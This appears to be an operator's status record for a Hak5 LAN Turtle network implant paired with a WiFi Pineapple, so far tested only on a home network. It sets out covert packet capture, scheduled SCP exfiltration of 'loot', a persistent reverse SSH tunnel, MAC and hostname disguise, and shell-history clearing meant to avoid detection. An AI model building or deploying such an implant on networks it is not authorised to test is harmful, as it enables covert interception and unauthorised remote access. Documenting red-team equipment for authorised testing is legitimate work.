# LAN Turtle — Device State

Last updated: 2026-03-08 (Phase 8 home network test PASSED)

## Hardware

| Field | Value |
|-------|-------|
| SoC | Atheros AR9331 |
| CPU | 400 MHz MIPS 24Kc |
| RAM | 64 MB DDR2 (59,580 KB usable) |
| Flash | 16 MB |
| USB | USB-A (host-facing, power + data) |
| Ethernet | RJ45 (target-facing) |

## Firmware

| Field | Value |
|-------|-------|
| Version | 6.2 |
| Kernel | Linux 4.14.134 (MIPS) |
| OS | OpenWrt 19.07-SNAPSHOT r0+10354-152c8adcb7 |
| Arch | ar71xx/generic (mips_24kc) |
| Flash date | 2026-03-08 (factory reset + firmware recovery) |

## Storage

| Filesystem | Size | Used | Free | Mount |
|-----------|------|------|------|-------|
| /dev/root | 12.8M | 12.8M | 0 | /rom (read-only) |
| overlay | 1.5M | 244K | 1.3M | / (writable, 16% used) |
| tmpfs | 29.1M | 80K | 29.0M | /tmp |

## Network Interfaces

| Interface | Role | MAC | IP | Config |
|-----------|------|-----|-----|--------|
| eth0 | LAN (host-facing USB) | 00:13:37:A6:FC:EF | 172.16.84.1/24 | Static |
| eth1 | WAN (target-facing RJ45) | 02:27:e6:a2:0d:36 (spoofed on boot) | DHCP | MAC spoofed via rc.local |
| tun0 | VPN tunnel to Pineapple | — | 10.8.0.2 (expected) | OpenVPN client |

## Network Configuration

- **LAN gateway**: 172.16.84.157 (Eddie's PC)
- **DNS**: 8.8.8.8, 1.1.1.1 (configured via UCI)
- **DHCP server**: Active on LAN, range .100-.250, 12h lease
- **WAN masquerade**: Enabled (NAT from LAN through target network)
- **LAN→WAN forwarding**: Enabled

## Firewall Summary

- **Default policy**: REJECT all
- **LAN zone**: ACCEPT in/out/forward (management access)
- **WAN zone**: REJECT in, ACCEPT out, ACCEPT forward, masquerade
- **VPN zone**: ACCEPT in/out, REJECT forward, masquerade, bidirectional forwarding with LAN

## Deployment Configuration

### OpenVPN Client
- Config: `/etc/openvpn/client.conf`
- Remote: 192.168.1.76:1194 UDP (home test — update for field deployment)
- Cipher: AES-128-CBC + SHA256
- Reconnect: retry 30s, never give up
- Keys: `/etc/openvpn/keys/` (ca.crt, client.crt, client.key, ta.key)
- Logging: /tmp only

### Autossh Reverse Tunnel
- Config: `/etc/config/autossh`
- Target: `root@10.8.0.1` (Pineapple VPN address)
- Tunnel: `-R 2222:localhost:22`
- Key: `/root/.ssh/id_ed25519_turtle_to_pineapple`
- Monitor port: 20000, poll: 30s

### Traffic Capture
- Script: `/root/capture.sh`
- Interface: eth1 (target-facing)
- Rotation: 5MB x 4 files = 20MB max (fits in tmpfs)
- Filter: Excludes VPN (UDP 1194) and SSH management (port 22 on 10.8.0/24)
- Output: `/tmp/captures/`

### Loot Exfiltration
- Script: `/root/exfil.sh`
- Destination: Pineapple `/root/loot/turtle/YYYYMMDD/`
- Transport: SCP over VPN tunnel
- Schedule: cron `*/15 * * * *`

### Boot Sequence (`/etc/rc.local`)
1. MAC spoof eth1 → 02:27:e6:a2:0d:36
2. Sleep 30s (DHCP)
3. OpenVPN start
4. Sleep 15s (tun0)
5. Autossh start
6. capture.sh start
7. Clear shell history

## Hardening

| Control | Status |
|---------|--------|
| Root password | Changed from default (store in password manager) |
| SSH password auth | Disabled (key-only) |
| Hostname | USB-ETH0 (innocuous) |
| MAC spoofing | eth1 spoofed on boot (hide Hak5 OUI 00:13:37) |
| Logging | /tmp only (no persistent writes) |
| Shell history | Cleared on every boot |
| Overlay footprint | 244KB / 1.5MB (16%) — minimal |

## Installed Tools (Notable)

| Package | Version | Purpose |
|---------|---------|---------|
| nmap-ssl | 7.70 | Network scanning |
| ncat-ssl | 7.70 | Netcat with SSL |
| netcat | 0.7.1 | Classic netcat |
| tcpdump | 4.9.2 | Packet capture |
| autossh | 1.4g | Persistent SSH tunnels |
| openvpn-openssl | 2.4.7 | VPN tunnel |
| cc-client | master | Hak5 Cloud C2 client |
| python 2.7 | 2.7.16 | Scripting |

Total packages: 171

## Access

| Method | Details |
|--------|---------|
| Direct SSH | `ssh -i ~/.ssh/id_ed25519_turtle root@172.16.84.1` |
| WSL alias | `ssh turtle` (from WSL kali-linux) |
| Reverse tunnel | `ssh -p 2222 root@172.16.42.1` (through Pineapple) |
| VPN direct | `ssh root@10.8.0.2` (from Pineapple, VPN up) |
| Password auth | DISABLED |
| SSH daemon | OpenSSH (not Dropbear) |

## Home Network Test Results (2026-03-08)

| Test | Result |
|------|--------|
| Turtle DHCP on home network | PASS — 192.168.1.77 |
| VPN tunnel to Pineapple | PASS — 10.8.0.2 ↔ 10.8.0.1 |
| Autossh reverse tunnel | PASS — port 2222 on Pineapple |
| SSH through reverse tunnel | PASS — full shell access |
| tcpdump capture | PASS — eth1, rotating pcaps |
| Exfil to Pineapple | PASS — SCP over VPN, cron */15 |
| Pull loot to Eddie's PC | PASS — valid pcap (1834 packets, 293KB) |
| Turtle reboot recovery | PASS — all services auto-restart |
| Pineapple reboot recovery | PASS — OpenVPN server + Turtle reconnect |
| MAC spoofing | PASS — 02:27:E6:A2:0D:36 (not Hak5 OUI) |
| Hostname disguise | PASS — "USB-ETH0" on router device table |

**Deployment config**: USB-A in router USB port (power only), RJ45 in router switch port.
**Pineapple IP**: 192.168.1.76 (home WiFi wlan2 client mode).
**Turtle IP**: 192.168.1.77 (DHCP from home router).

### Pineapple OpenVPN Server Persistence

OpenVPN server on Pineapple is started via `/etc/rc.local` (not UCI init.d — that approach didn't reliably work):
```
(sleep 15 && openvpn --daemon --config /etc/openvpn/server.conf --status /tmp/openvpn-status.log 60) &
```

UCI openvpn init.d is **disabled** to avoid conflicts. The rc.local approach was validated through a full Pineapple reboot cycle.

## Cloud C2

- Client binary: installed (`cc-client`)
- Enrollment: **Not enrolled** (deferred)
